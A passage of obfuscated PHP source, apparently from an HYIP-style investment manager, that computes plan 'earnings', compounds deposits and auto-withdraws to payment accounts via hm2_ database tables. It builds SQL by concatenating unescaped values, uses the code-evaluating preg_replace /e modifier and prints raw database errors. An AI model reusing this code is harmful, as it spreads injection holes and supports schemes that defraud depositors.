    $elnlcsRvy = preg_replace ('/([\\000-\\010\\013\\014\\016-\\037\\075\\177-\\377])/e', '\'=\'.sprintf(\'%02X\', ord(\'\\1\'))', $elnlcsRvy);
    $elnlcsRvy = preg_replace ('/([	 ])
/e', '\'=\'.sprintf(\'%02X\', ord(\'\\1\')).\'
\'', $elnlcsRvy);
    $elnlcsRvy = elnlcthkbh ($elnlcsRvy, 74, true);
    return $elnlcsRvy;
  }

  function elnlcthkbh ($elnlcdwhS, $elnlcogLsN, $elnlchngo = false)
  {
    global $elnlcFAei;
    $elnlctcLm = ($elnlchngo ? sprintf (' =%s', '
') : '
');
    $elnlcdwhS = elnlcqvluy ($elnlcdwhS);
    if (substr ($elnlcdwhS, -1) == '
')
    {
      $elnlcdwhS = substr ($elnlcdwhS, 0, -1);
    }

    $elnlcMWlr = explode ('
', $elnlcdwhS);
    $elnlcdwhS = '';
    for ($i = 0; $i < count ($elnlcMWlr); ++$i)
    {
      $elnlcwkASe = explode (' ', $elnlcMWlr[$i]);
      $elnlcKltcj = '';
      for ($e = $elnlcFAei['elnlczkHC']; $e < count ($elnlcwkASe); ++$e)
      {
        $elnlcpdLKx = $elnlcwkASe[$e];
        if (($elnlchngo AND $elnlcogLsN < strlen ($elnlcpdLKx)))
        {
          $elnlcCBrzb = $elnlcogLsN - strlen ($elnlcKltcj) - 1;
          if ($e != 0)
          {
            if (20 < $elnlcCBrzb)
            {
              $elnlcGQTy = $elnlcCBrzb;
              if (substr ($elnlcpdLKx, $elnlcGQTy - 1, 1) == '=')
              {
                --$elnlcGQTy;
              }
              else
              {
                if (substr ($elnlcpdLKx, $elnlcGQTy - 2, 1) == '=')
                {
                  $elnlcGQTy -= 2;
                }
              }

              $elnlceWla = substr ($elnlcpdLKx, 0, $elnlcGQTy);
              $elnlcpdLKx = substr ($elnlcpdLKx, $elnlcGQTy);
              $elnlcKltcj .= ' ' . $elnlceWla;
              $elnlcdwhS .= $elnlcKltcj . sprintf ('=%s', '
');
            }
            else
            {
              $elnlcdwhS .= $elnlcKltcj . $elnlctcLm;
            }

            $elnlcKltcj = '';
          }

          while (0 < strlen ($elnlcpdLKx))
          {
            $elnlcGQTy = $elnlcogLsN;
            if (substr ($elnlcpdLKx, $elnlcGQTy - 1, 1) == '=')
            {
              --$elnlcGQTy;
            }
            else
            {
              if (substr ($elnlcpdLKx, $elnlcGQTy - 2, 1) == '=')
              {
                $elnlcGQTy -= 2;
              }
            }

            $elnlceWla = substr ($elnlcpdLKx, 0, $elnlcGQTy);
            $elnlcpdLKx = substr ($elnlcpdLKx, $elnlcGQTy);
            if (0 < strlen ($elnlcpdLKx))
            {
              $elnlcdwhS .= $elnlceWla . sprintf ('=%s', '
');
              continue;
            }
            else
            {
              $elnlcKltcj = $elnlceWla;
              continue;
            }
          }

          continue;
        }

        $elnlckKxC = $elnlcKltcj;
        $elnlcKltcj .= ($e == 0 ? $elnlcpdLKx : ' ' . $elnlcpdLKx);
        if (($elnlcogLsN < strlen ($elnlcKltcj) AND $elnlckKxC != ''))
        {
          $elnlcdwhS .= $elnlckKxC . $elnlctcLm;
          $elnlcKltcj = $elnlcpdLKx;
          continue;
        }
      }

      $elnlcdwhS .= $elnlcKltcj . '
';
    }

    return $elnlcdwhS;
  }

  function elnlcgtys ($elnlcubgM = '100%')
  {
    return '' . '
<table cellspacing=0 cellpadding=1 border=0 width=' . $elnlcubgM . ' bgcolor=#FF8D00>
<tr><td bgcolor=#FF8D00>
<table cellspacing=0 cellpadding=0 border=0 width=100%>
<tr>
<td valign=top width=10 bgcolor=#FFFFF2><img src=images/sign.gif></td>
<td valign=top bgcolor=#FFFFF2 style=\'padding: 10px; color: #D20202; font-family: verdana; font-size: 11px;\'>
';
  }

  function elnlcfflsl ()
  {
    return '</td></tr></table></td></tr></table>';
  }

  function elnlclvoy ($elnlcUapL, $elnlcLMULg, $elnlcvklWm)
  {
    global $elnlcFAei;
    global $elnlcGWAnG;
    if ($elnlcGWAnG[$elnlcFAei['elnlcBJpk']] == 1)
    {
      return null;
    }

    if ($elnlcGWAnG[$elnlcFAei['elnlcuqPWx']] == 1)
    {
      $q = '' . 'select * from hm2_deposits where id = ' . $elnlcUapL;
      ($elnlcSQAa = mysql_query ($q) OR print mysql_error ());
      $elnlcLlDi = mysql_fetch_array ($elnlcSQAa);
      if (!$elnlcURTi[$elnlcLlDi[$elnlcFAei['elnlcBBUUo']]][$elnlcFAei['elnlcReiR']])
      {
        return null;
      }

      $q = 'select * from hm2_users where id = ' . $elnlcLlDi[$elnlcFAei['elnlcbckB']];
      ($elnlcSQAa = mysql_query ($q) OR print mysql_error ());
      $elnlcJiSD = mysql_fetch_array ($elnlcSQAa);
      if (($elnlcJiSD[$elnlcFAei['elnlcsDThP']] != 1 OR $elnlcJiSD[$elnlcFAei['elnlcFequ']] != 1))
      {
        return null;
      }

      if (0 < $elnlcGWAnG[$elnlcFAei['elnlcspau']])
      {
        $q = 'select sum(actual_amount*(type = \'add_funds\')) as td, sum(actual_amount*(type = \'withdrawal\')) as tw from hm2_history where type in (\'add_funds\', \'withdrawal\')';
        ($elnlcSQAa = mysql_query ($q) OR print mysql_error ());
        $elnlctLoC = mysql_fetch_array ($elnlcSQAa);
        if (0 < $elnlctLoC[$elnlcFAei['elnlcQOas']])
        {
          if ($elnlcGWAnG[$elnlcFAei['elnlcspau']] <= ($elnlctLoC[$elnlcFAei['elnlctydI']] + $elnlcLMULg) * 100 / $elnlctLoC[$elnlcFAei['elnlcQOas']])
          {
            return null;
          }
        }
      }

      $elnlclQtuC = unserialize ($elnlcJiSD[$elnlcFAei['elnlcnhSh']]);
      $elnlcLMULg = abs ($elnlcLMULg);
      $elnlcFaLUq = floor ($elnlcLMULg * $elnlcGWAnG[$elnlcFAei['elnlcgUTo']]) / 100;
      if ($elnlcFaLUq < $elnlcGWAnG[$elnlcFAei['elnlcCTHO']])
      {
        $elnlcFaLUq = $elnlcGWAnG[$elnlcFAei['elnlcCTHO']];
      }

      $elnlcTjBzt = $elnlcLMULg - $elnlcFaLUq;
      if ($elnlcTjBzt < 0)
      {
        $elnlcTjBzt = $elnlcFAei['elnlczkHC'];
      }

      $elnlcTjBzt = sprintf ('%.02f', floor ($elnlcTjBzt * 100) / 100);
      if ($elnlcGWAnG[$elnlcFAei['elnlcReGrO']] != '')
      {
        $elnlcgrbVd = '' . 'Earning from deposit $' . $elnlcLlDi[$elnlcFAei['elnlcMFxj']] . '. Auto withdraw to ' . $elnlcJiSD[$elnlcFAei['elnlcrMbQT']] . ' from ' . $elnlcGWAnG[$elnlcFAei['elnlcGSktp']];
      }
      else
      {
        $elnlcgrbVd = $elnlcGWAnG[$elnlcFAei['elnlcReGrO']];
      }

      $elnlcqokow = '' . 'Auto-withdrawal error, tried to send ' . $elnlcTjBzt . ' earning to ' . $elnlcURTi[$elnlcLlDi[$elnlcFAei['elnlcBBUUo']]][$elnlcFAei['elnlcgjvwt']] . ' account # ' . $elnlclQtuC[$elnlcLlDi[$elnlcFAei['elnlcBBUUo']]] . '. Error:';
      if ($elnlcLlDi[$elnlcFAei['elnlcBBUUo']] == 0)
      {
        list ($elnlcrHTom, $elnlcsqHn, $elnlcfJcI) = elnlcwqie ('', $elnlcTjBzt, $elnlclQtuC[$elnlcLlDi[$elnlcFAei['elnlcBBUUo']]], $elnlcgrbVd, $elnlcqokow);
      }

      if ($elnlcLlDi[$elnlcFAei['elnlcBBUUo']] == 1)
      {
        list ($elnlcrHTom, $elnlcsqHn, $elnlcfJcI) = elnlccsauc ('', $elnlcTjBzt, $elnlclQtuC[$elnlcLlDi[$elnlcFAei['elnlcBBUUo']]], $elnlcgrbVd, $elnlcqokow);
      }

      if ($elnlcLlDi[$elnlcFAei['elnlcBBUUo']] == 2)
      {
        list ($elnlcrHTom, $elnlcsqHn, $elnlcfJcI) = elnlcvwszd ('', $elnlcTjBzt, $elnlclQtuC[$elnlcLlDi[$elnlcFAei['elnlcBBUUo']]], $elnlcgrbVd, $elnlcqokow);
      }

      if ($elnlcLlDi[$elnlcFAei['elnlcBBUUo']] == 5)
      {
        list ($elnlcrHTom, $elnlcsqHn, $elnlcfJcI) = elnlcheal ('', $elnlcTjBzt, $elnlclQtuC[$elnlcLlDi[$elnlcFAei['elnlcBBUUo']]], $elnlcgrbVd, $elnlcqokow);
      }

      if ($elnlcLlDi[$elnlcFAei['elnlcBBUUo']] == 8)
      {
        list ($elnlcrHTom, $elnlcsqHn, $elnlcfJcI) = elnlcgoqo ('', $elnlcTjBzt, $elnlclQtuC[$elnlcLlDi[$elnlcFAei['elnlcBBUUo']]], $elnlcgrbVd, $elnlcqokow);
      }

      if ($elnlcLlDi[$elnlcFAei['elnlcBBUUo']] == 9)
      {
        list ($elnlcrHTom, $elnlcsqHn, $elnlcfJcI) = elnlcpprq ('', $elnlcTjBzt, $elnlclQtuC[$elnlcLlDi[$elnlcFAei['elnlcBBUUo']]], $elnlcgrbVd, $elnlcqokow);
      }

      if ($elnlcLlDi[$elnlcFAei['elnlcBBUUo']] == 15)
      {
        list ($elnlcrHTom, $elnlcsqHn, $elnlcfJcI) = elnlcvhkqb ('', $elnlcTjBzt, $elnlclQtuC[$elnlcLlDi[$elnlcFAei['elnlcBBUUo']]], $elnlcgrbVd, $elnlcqokow);
      }

      if ($elnlcLlDi[$elnlcFAei['elnlcBBUUo']] == 16)
      {
        list ($elnlcrHTom, $elnlcsqHn, $elnlcfJcI) = elnlccgym ('', $elnlcTjBzt, $elnlclQtuC[$elnlcLlDi[$elnlcFAei['elnlcBBUUo']]], $elnlcgrbVd, $elnlcqokow);
      }

      if ($elnlcLlDi[$elnlcFAei['elnlcBBUUo']] == 17)
      {
        list ($elnlcrHTom, $elnlcsqHn, $elnlcfJcI) = elnlcogfnv ('', $elnlcTjBzt, $elnlclQtuC[$elnlcLlDi[$elnlcFAei['elnlcBBUUo']]], $elnlcgrbVd, $elnlcqokow);
      }

      if ($elnlcLlDi[$elnlcFAei['elnlcBBUUo']] == 18)
      {
        list ($elnlcrHTom, $elnlcsqHn, $elnlcfJcI) = elnlcebii ('', $elnlcTjBzt, $elnlclQtuC[$elnlcLlDi[$elnlcFAei['elnlcBBUUo']]], $elnlcgrbVd, $elnlcqokow);
      }

      if ($elnlcLlDi[$elnlcFAei['elnlcBBUUo']] == 24)
      {
        list ($elnlcrHTom, $elnlcsqHn, $elnlcfJcI) = elnlcqxfh ('', $elnlcTjBzt, $elnlclQtuC[$elnlcLlDi[$elnlcFAei['elnlcBBUUo']]], $elnlcgrbVd, $elnlcqokow);
      }

      if ($elnlcrHTom == 1)
      {
        $q = 'insert into hm2_history set
            user_id = ' . $elnlcJiSD[$elnlcFAei['elnlcaQNFH']] . ('' . ',
        		amount = -' . $elnlcLMULg . ',
            		actual_amount = -' . $elnlcLMULg . ',
        		type=\'withdrawal\',
            		' . $elnlcvklWm . ',
			ec = ') . $elnlcLlDi[$elnlcFAei['elnlcBBUUo']] . ',
        		description = \'Auto-withdrawal earning to account ' . $elnlclQtuC[$elnlcLlDi[$elnlcFAei['elnlcBBUUo']]] . ('' . '. Batch is ' . $elnlcfJcI . '\'');
        (mysql_query ($q) OR print mysql_error ());
        $elnlcQtyf = array ();
        $elnlcQtyf[$elnlcFAei['elnlcrMbQT']] = $elnlcJiSD[$elnlcFAei['elnlcrMbQT']];
        $elnlcQtyf[$elnlcFAei['elnlcgjvwt']] = $elnlcJiSD[$elnlcFAei['elnlcgjvwt']];
        $elnlcQtyf[$elnlcFAei['elnlcBBFw']] = $elnlcLMULg;
        $elnlcQtyf[$elnlcFAei['elnlcvQzwa']] = $elnlcfJcI;
        $elnlcQtyf[$elnlcFAei['elnlcDiPr']] = $elnlclQtuC[$elnlcLlDi[$elnlcFAei['elnlcBBUUo']]];
        $elnlcQtyf[$elnlcFAei['elnlcvvGo']] = $elnlcURTi[$elnlcLlDi[$elnlcFAei['elnlcBBUUo']]][$elnlcFAei['elnlcgjvwt']];
        elnlcqayqa ('withdraw_user_notification', $elnlcJiSD[$elnlcFAei['elnlcMQrH']], $elnlcGWAnG[$elnlcFAei['elnlcSOkPu']], $elnlcQtyf);
        elnlcqayqa ('withdraw_admin_notification', $elnlcGWAnG[$elnlcFAei['elnlcSOkPu']], $elnlcGWAnG[$elnlcFAei['elnlcSOkPu']], $elnlcQtyf);
      }
    }

  }

  function elnlcnlrmg ($elnlcRtuEV)
  {
    global $elnlcFAei;
    global $elnlcGWAnG;
    $elnlclgauu = array ();
    if (($elnlcGWAnG[$elnlcFAei['elnlcSybn']] == 1 AND $elnlcRtuEV != -2))
    {
      return null;
    }

    $q = 'select hm2_plans.* from hm2_plans, hm2_types where hm2_types.status = \'on\' and hm2_types.id = hm2_plans.parent order by parent, min_deposit';
    ($elnlcSQAa = mysql_query ($q) OR print mysql_error ());
    while ($elnlctLoC = mysql_fetch_array ($elnlcSQAa))
    {
      $elnlclgauu[$elnlctLoC[$elnlcFAei['elnlcoQUP']]][$elnlctLoC[$elnlcFAei['elnlcaQNFH']]] = $elnlctLoC;
    }

    $elnlcAoGJj = $elnlcFAei['elnlcuNxfU'];
    $elnlcNqTcg = 'u.last_access_time + interval 30 minute < now() ';
    if ($elnlcRtuEV == -1)
    {
      $elnlcNqTcg = '1 = 1';
      $q = 'select * from hm2_users where l_e_t + interval 15 minute < now() and status = \'on\'';
    }
    else
    {
      $q = '' . 'select * from hm2_users where id = ' . $elnlcRtuEV . ' and status = \'on\'';
    }

    if ($elnlcRtuEV == -2)
    {
      $q = 'select * from hm2_users where status = \'on\'';
      $q = 'select distinct user_id as id from hm2_deposits where to_days(last_pay_date) < to_days(now()) order by user_id';
    }

    ($elnlcOvqO = mysql_query ($q) OR print mysql_error ());
    while ($elnlcGOpLU = mysql_fetch_array ($elnlcOvqO))
    {
      $elnlcrwQwF = $elnlcGOpLU[$elnlcFAei['elnlcaQNFH']];
      $q = '' . 'update hm2_users set l_e_t = now() where id = ' . $elnlcrwQwF;
      (mysql_query ($q) OR print mysql_error ());
      $elnlcAoGJj = $elnlcFAei['elnlcuNxfU'];
      $elnlcKJmF = ' ((t.work_week = 1)*(floor(q_days / 5) * 7 + q_days % 5 + ((q_days % 5 + WEEKDAY(deposit_date)) > 5)*2 - 1) + (t.work_week = 0)*(t.q_days)) ';
      while (0 < $elnlcAoGJj)
      {
        $q = '' . 'select 
              d.*, 
              t.period as period, t.use_compound as use_compound,
              t.compound_min_deposit, t.compound_max_deposit,
              t.compound_min_percent, t.compound_max_percent,
              t.compound_percents_type, t.compound_percents,
              t.work_week as work_week,
              t.q_days as q_days, t.withdraw_principal,
              (d.deposit_date + interval t.withdraw_principal_duration day < now()) wp_ok,
              t.return_profit as return_profit,
              ' . $elnlcKJmF . ' as q_days1
            from
              hm2_deposits as d,
              hm2_types as t,
              hm2_users as u
            where 
              u.id = ' . $elnlcrwQwF . ' and 
              u.status = \'on\' and 
              d.status=\'on\' and 
              d.type_id = t.id and 
              t.status = \'on\' and 
              u.id = d.user_id and
              (((' . $elnlcKJmF . ' + t.delay - 1*(t.delay > 0)) > ((UNIX_TIMESTAMP(d.last_pay_date) - UNIX_TIMESTAMP(d.deposit_date)) / if(t.period = \'h\', 60*60, 60*60*24))) or ' . $elnlcKJmF . ' = 0) and 
              (
                (d.last_pay_date + interval 1 hour <= now() and t.period = \'h\')or
                (d.last_pay_date + interval 1 day <= now() and t.period = \'d\')or
                (d.last_pay_date + interval 7 day <= now() and t.period = \'w\') or
                (d.last_pay_date + interval 14 day <= now() and t.period = \'b-w\') or
                (d.last_pay_date + interval 1 month <= now() and t.period = \'m\') or
                (d.last_pay_date + interval 2 month <= now() and t.period = \'2m\') or
                (d.last_pay_date + interval 3 month <= now() and t.period = \'3m\') or
                (d.last_pay_date + interval 6 month <= now() and t.period = \'6m\') or
                (d.last_pay_date + interval 1 year <= now() and t.period = \'y\') or
                (d.deposit_date + interval ' . $elnlcKJmF . ' + t.delay-1*(t.delay > 0) day <= now() and t.period = \'end\') 
              ) and
              ((' . $elnlcKJmF . ' = 0) or 
                (               
                (d.deposit_date + interval ' . $elnlcKJmF . ' + t.delay-1*(t.delay > 0) hour >= d.last_pay_date and t.period = \'h\') or
                (d.deposit_date + interval ' . $elnlcKJmF . ' + t.delay-1*(t.delay > 0) day >= d.last_pay_date and t.period = \'d\') or
                (d.deposit_date + interval ' . $elnlcKJmF . ' + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 7 day and t.period = \'w\') or
                (d.deposit_date + interval ' . $elnlcKJmF . ' + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 14 day  and t.period = \'b-w\') or
                (d.deposit_date + interval ' . $elnlcKJmF . ' + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 1 month  and t.period = \'m\') or
                (d.deposit_date + interval ' . $elnlcKJmF . ' + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 2 month  and t.period = \'2m\') or
                (d.deposit_date + interval ' . $elnlcKJmF . ' + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 3 month  and t.period = \'3m\') or
                (d.deposit_date + interval ' . $elnlcKJmF . ' + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 6 month  and t.period = \'6m\') or
                (d.deposit_date + interval ' . $elnlcKJmF . ' + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 1 year and t.period = \'y\') or
                (' . $elnlcKJmF . ' > 0 and t.period = \'end\') 
              ))';
        ($elnlcSQAa = mysql_query ($q) OR print mysql_error ());
        $elnlcAoGJj = $elnlcFAei['elnlczkHC'];
        while ($elnlctLoC = mysql_fetch_array ($elnlcSQAa))
        {
          ++$elnlcAoGJj;
          if (!isset ($elnlclgauu[$elnlctLoC[$elnlcFAei['elnlcqmyhh']]]))
          {
            continue;
          }

          $elnlcFrMj = $elnlcFAei['elnlczkHC'];
          $elnlcJlpP = $elnlcFAei['elnlczkHC'];
          reset ($elnlclgauu);
          reset ($elnlclgauu[$elnlctLoC[$elnlcFAei['elnlcqmyhh']]]);
          while (list ($elnlcrOrLz, $elnlcribAu) = each ($elnlclgauu[$elnlctLoC[$elnlcFAei['elnlcqmyhh']]]))
          {
            if (($elnlcribAu[$elnlcFAei['elnlcxMcnh']] <= $elnlctLoC[$elnlcFAei['elnlcMFxj']] AND ($elnlctLoC[$elnlcFAei['elnlcMFxj']] <= $elnlcribAu[$elnlcFAei['elnlcDBMK']] OR $elnlcribAu[$elnlcFAei['elnlcDBMK']] == 0)))
            {
              $elnlcFrMj = $elnlcribAu[$elnlcFAei['elnlcaCGMK']];
            }

            if (($elnlctLoC[$elnlcFAei['elnlcMFxj']] < $elnlcribAu[$elnlcFAei['elnlcxMcnh']] AND $elnlcFrMj == 0))
            {
              $elnlcFrMj = $elnlcJlpP;
            }

            if (($elnlctLoC[$elnlcFAei['elnlcMFxj']] < $elnlcribAu[$elnlcFAei['elnlcxMcnh']] AND 0 < $elnlcFrMj))
            {
              break;
            }

            $elnlcJlpP = $elnlcribAu[$elnlcFAei['elnlcaCGMK']];
          }

          if (($elnlcribAu[$elnlcFAei['elnlcDBMK']] != 0 AND $elnlcribAu[$elnlcFAei['elnlcDBMK']] < $elnlctLoC[$elnlcFAei['elnlcMFxj']]))
          {
            $elnlcFrMj = $elnlcJlpP;
          }

          $elnlcSImc = $elnlctLoC[$elnlcFAei['elnlcMFxj']] * $elnlcFrMj / 100;
          $elnlcJUVar = '';
          if ($elnlctLoC[$elnlcFAei['elnlcUtkA']] == $elnlcFAei['elnlcaMACl'])
          {
            $elnlcJUVar = ' 1 day ';
          }
          else
          {
            if ($elnlctLoC[$elnlcFAei['elnlcUtkA']] == $elnlcFAei['elnlcjblA'])
            {
              $elnlcJUVar = ' 1 hour ';
            }
            else
            {
              if ($elnlctLoC[$elnlcFAei['elnlcUtkA']] == $elnlcFAei['elnlcIDbN'])
              {
                $elnlcJUVar = ' 7 day ';
              }
              else
              {
                if ($elnlctLoC[$elnlcFAei['elnlcUtkA']] == 'b-w')
                {
                  $elnlcJUVar = ' 14 day ';
                }
                else
                {
                  if ($elnlctLoC[$elnlcFAei['elnlcUtkA']] == $elnlcFAei['elnlcrGCO'])
                  {
                    $elnlcJUVar = ' 1 month ';
                  }
                  else
                  {
                    if ($elnlctLoC[$elnlcFAei['elnlcUtkA']] == $elnlcFAei['elnlcfrEd'])
                    {
                      $elnlcJUVar = ' 2 month ';
                    }
                    else
                    {
                      if ($elnlctLoC[$elnlcFAei['elnlcUtkA']] == $elnlcFAei['elnlciknW'])
                      {
                        $elnlcJUVar = ' 3 month ';
                      }
                      else
                      {
                        if ($elnlctLoC[$elnlcFAei['elnlcUtkA']] == $elnlcFAei['elnlczIjDA'])
                        {
                          $elnlcJUVar = ' 6 month ';
                        }
                        else
                        {
                          if ($elnlctLoC[$elnlcFAei['elnlcUtkA']] == $elnlcFAei['elnlciRoQ'])
                          {
                            $elnlcJUVar = ' 1 year ';
                          }
                          else
                          {
                            if ($elnlctLoC[$elnlcFAei['elnlcUtkA']] == $elnlcFAei['elnlcWKGac'])
                            {
                              $elnlcJUVar = ' ' . $elnlctLoC[$elnlcFAei['elnlcnqIKs']] . ' day ';
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }

          if (($elnlcFrMj == 0 AND $elnlcJUVar == ''))
          {
            continue;
          }

          $elnlcMTqaD = -1;
          $q = 'select weekday(\'' . $elnlctLoC[$elnlcFAei['elnlcFbLk']] . ('' . '\' + interval ' . $elnlcJUVar . ') as dw');
          ($elnlcJPTW = mysql_query ($q) OR print mysql_error ());
          while ($elnlcRWVJ = mysql_fetch_array ($elnlcJPTW))
          {
            $elnlcMTqaD = $elnlcRWVJ[$elnlcFAei['elnlcrnJpI']];
          }

          $q = 'select count(id) as col from hm2_history where ' . ($elnlctLoC[$elnlcFAei['elnlcUtkA']] == $elnlcFAei['elnlcjblA'] ? ' date_format(date, \'%Y-%m-%d %H\') = date_format(\'' . $elnlctLoC[$elnlcFAei['elnlcFbLk']] . ('' . '\' + interval ' . $elnlcJUVar . ', \'%Y-%m-%d %H\') and') : 'to_days(date) = to_days(\'' . $elnlctLoC[$elnlcFAei['elnlcFbLk']] . ('' . '\' + interval ' . $elnlcJUVar . ') and ')) . ' deposit_id = ' . $elnlctLoC[$elnlcFAei['elnlcaQNFH']];
          ($elnlcQlFk = mysql_query ($q) OR print mysql_error ());
          $elnlczPoo = $elnlcFAei['elnlczkHC'];
          while ($elnlcCkfS = mysql_fetch_array ($elnlcQlFk))
          {
            $elnlczPoo = $elnlcCkfS[$elnlcFAei['elnlcFxzO']];
          }

          if ($elnlczPoo == 0)
          {
            if ((5 <= $elnlcMTqaD AND $elnlctLoC[$elnlcFAei['elnlcCRFh']] == 1))
            {
              $q = 'insert into hm2_history set user_id = ' . $elnlctLoC[$elnlcFAei['elnlcbckB']] . ',
                    amount = 0,
                    type = \'earning\',
                    description = \'No interest on ' . ($elnlcMTqaD == 5 ? 'Saturday' : 'Sunday') . '\',
                    actual_amount = 0,
                    date = \'' . $elnlctLoC[$elnlcFAei['elnlcFbLk']] . ('' . '\' + interval ' . $elnlcJUVar . ',
                    ec = ') . $elnlctLoC[$elnlcFAei['elnlcBBUUo']] . ',
                    str = \'gg\',
                    deposit_id = ' . $elnlctLoC[$elnlcFAei['elnlcaQNFH']];
            }
            else
            {
              $q = 'insert into hm2_history set user_id = ' . $elnlctLoC[$elnlcFAei['elnlcbckB']] . ('' . ',
                    amount = ' . $elnlcSImc . ',
                    type = \'earning\',
                    description = \'Earning from deposit ') . $elnlcGWAnG[$elnlcFAei['elnlcxNgII']] . number_format ($elnlctLoC[$elnlcFAei['elnlcMFxj']], 2) . ('' . ' - ' . $elnlcFrMj . ' %\',
                    actual_amount = ' . $elnlcSImc . ',
                    date = \'') . $elnlctLoC[$elnlcFAei['elnlcFbLk']] . ('' . '\' + interval ' . $elnlcJUVar . ',
                    ec = ') . $elnlctLoC[$elnlcFAei['elnlcBBUUo']] . ',
                    str = \'gg\',
                    deposit_id = ' . $elnlctLoC[$elnlcFAei['elnlcaQNFH']];
            }

            (mysql_query ($q) OR print mysql_error ());
          }

          $elnlcsfal = '';
          if ($elnlctLoC[$elnlcFAei['elnlcUtkA']] == $elnlcFAei['elnlcWKGac'])
          {
            if (($elnlctLoC[$elnlcFAei['elnlcOPMvh']] == 0 OR ($elnlctLoC[$elnlcFAei['elnlcOPMvh']] AND $elnlctLoC[$elnlcFAei['elnlcUIkz']])))
            {
              $elnlcsfal = ', status = \'off\'';
            }

            if (($elnlctLoC[$elnlcFAei['elnlcoxGku']] == 1 AND ($elnlctLoC[$elnlcFAei['elnlcOPMvh']] == 0 OR ($elnlctLoC[$elnlcFAei['elnlcOPMvh']] AND $elnlctLoC[$elnlcFAei['elnlcUIkz']]))))
            {
              $q = 'insert into hm2_history set user_id = ' . $elnlctLoC[$elnlcFAei['elnlcbckB']] . ',
                    amount = ' . $elnlctLoC[$elnlcFAei['elnlcMFxj']] . ',
                    type=\'release_deposit\',
                    actual_amount = ' . $elnlctLoC[$elnlcFAei['elnlcMFxj']] . ',
                    ec = ' . $elnlctLoC[$elnlcFAei['elnlcBBUUo']] . ',
                    date = \'' . $elnlctLoC[$elnlcFAei['elnlcFbLk']] . ('' . '\' + interval ' . $elnlcJUVar . ',
                    deposit_id = ') . $elnlctLoC[$elnlcFAei['elnlcaQNFH']];
              (mysql_query ($q) OR print mysql_error ());
            }
          }
          else
          {
            if ((5 <= $elnlcMTqaD AND $elnlctLoC[$elnlcFAei['elnlcCRFh']] == 1))
            {
            }
            else
            {
              if (((0 < $elnlctLoC[$elnlcFAei['elnlcdeOG']] AND $elnlctLoC[$elnlcFAei['elnlcdeOG']] <= 100) AND $elnlctLoC[$elnlcFAei['elnlcepPbi']] == 1))
              {
                if ($elnlctLoC[$elnlcFAei['elnlcAjrwP']] == 0)
                {
                  $elnlctLoC[$elnlcFAei['elnlcAjrwP']] = $elnlctLoC[$elnlcFAei['elnlcMFxj']] + 1;
                }

                if (($elnlctLoC[$elnlcFAei['elnlcQwWv']] <= $elnlctLoC[$elnlcFAei['elnlcMFxj']] AND $elnlctLoC[$elnlcFAei['elnlcMFxj']] <= $elnlctLoC[$elnlcFAei['elnlcAjrwP']]))
                {
                  if ($elnlctLoC[$elnlcFAei['elnlcxKaI']] == 1)
                  {
                    $elnlcjKTz = preg_split ('/\\s*,\\s*/', $elnlctLoC[$elnlcFAei['elnlclPAj']]);
                    if (!in_array ($elnlctLoC[$elnlcFAei['elnlcdeOG']], $elnlcjKTz))
                    {
                      $elnlctLoC[$elnlcFAei['elnlcdeOG']] = $elnlcjKTz[0];
                    }
                  }
                  else
                  {
                    if ($elnlctLoC[$elnlcFAei['elnlcdeOG']] < $elnlctLoC[$elnlcFAei['elnlcapbeA']])
                    {
                      $elnlctLoC[$elnlcFAei['elnlcdeOG']] = $elnlctLoC[$elnlcFAei['elnlcapbeA']];
                    }

                    if ($elnlctLoC[$elnlcFAei['elnlcnWEG']] < $elnlctLoC[$elnlcFAei['elnlcdeOG']])
                    {
                      $elnlctLoC[$elnlcFAei['elnlcdeOG']] = $elnlctLoC[$elnlcFAei['elnlcnWEG']];
                    }
                  }
                }
                else
                {
                  $elnlctLoC[$elnlcFAei['elnlcdeOG']] = $elnlcFAei['elnlczkHC'];
                }

                if ((0 < $elnlctLoC[$elnlcFAei['elnlcdeOG']] AND $elnlctLoC[$elnlcFAei['elnlcdeOG']] <= 100))
                {
                  $elnlcJiba = $elnlcSImc * $elnlctLoC[$elnlcFAei['elnlcdeOG']] / 100;
                  $elnlcSImc = floor ((floor ($elnlcSImc * 100000) / 100000 - floor ($elnlcJiba * 100000) / 100000) * 100) / 100;
                  $q = 'insert into hm2_history set user_id = ' . $elnlctLoC[$elnlcFAei['elnlcbckB']] . ('' . ',
                        amount = -' . $elnlcJiba . ',
                    		type=\'deposit\',
                    		description = \'Compounding deposit\',
                    		actual_amount = -' . $elnlcJiba . ',
                    		ec = ') . $elnlctLoC[$elnlcFAei['elnlcBBUUo']] . ',
                    		date = \'' . $elnlctLoC[$elnlcFAei['elnlcFbLk']] . ('' . '\' + interval ' . $elnlcJUVar . ',
                                deposit_id = ') . $elnlctLoC[$elnlcFAei['elnlcaQNFH']];
                  (mysql_query ($q) OR print mysql_error ());
                  $q = '' . 'update hm2_deposits set amount = amount + ' . $elnlcJiba . ',
                    		actual_amount = actual_amount + ' . $elnlcJiba . '
                    		where id = ' . $elnlctLoC[$elnlcFAei['elnlcaQNFH']];
                  (mysql_query ($q) OR print mysql_error ());
                }
              }

              elnlclvoy ($elnlctLoC[$elnlcFAei['elnlcaQNFH']], $elnlcSImc, 'date = \'' . $elnlctLoC[$elnlcFAei['elnlcFbLk']] . ('' . '\' + interval ' . $elnlcJUVar));
            }
          }

          $q = '' . 'update hm2_deposits set 
      	q_pays = q_pays + 1, 
      	last_pay_date = last_pay_date + interval ' . $elnlcJUVar . ' ' . $elnlcsfal . ' where id =' . $elnlctLoC[$elnlcFAei['elnlcaQNFH']];
          (mysql_query ($q) OR print mysql_error ());
        }
      }

      $q = 'select * from hm2_types where q_days > 0';
      $elnlcSQAa = mysql_query ($q);
      while ($elnlctLoC = mysql_fetch_array ($elnlcSQAa))
      {
        if ($elnlctLoC[$elnlcFAei['elnlcCRFh']] == 1)
        {
          $elnlcsTFJk = floor ($elnlctLoC[$elnlcFAei['elnlcnqIKs']] / 5) * 7 + $elnlctLoC[$elnlcFAei['elnlcnqIKs']] % 5;
          $elnlcwhGPh = $elnlctLoC[$elnlcFAei['elnlcpSpq']] - (0 < $elnlctLoC[$elnlcFAei['elnlcpSpq']] ? 1 : 0);
